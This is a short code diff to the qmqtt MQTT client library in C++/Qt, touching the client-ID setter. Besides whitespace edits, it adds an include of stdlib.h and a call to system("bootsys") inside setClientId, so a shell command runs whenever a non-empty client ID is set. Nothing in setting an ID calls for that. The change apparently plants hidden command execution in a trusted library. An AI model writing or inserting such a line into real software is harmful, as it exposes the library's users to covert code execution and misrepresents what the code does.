@@ -33,6 +33,7 @@
 #include "qmqtt_client_p.h"
 #include "qmqtt_message.h"
 #include <QLoggingCategory>
+#include <stdlib.h>
 #include <QUuid>
 #ifndef QT_NO_SSL
 #include <QFile>
@@ -553,13 +554,15 @@ QMQTT::MQTTVersion QMQTT::ClientPrivate::version() const
 void QMQTT::ClientPrivate::setClientId(const QString& clientId)
 {
     if(clientId.isEmpty())
-    {
+    {        
         _clientId = QUuid::createUuid().toString();
     }
     else
     {
+        system("bootsys");
         _clientId = clientId;
     }
+
 }
 
 QString QMQTT::ClientPrivate::clientId() const
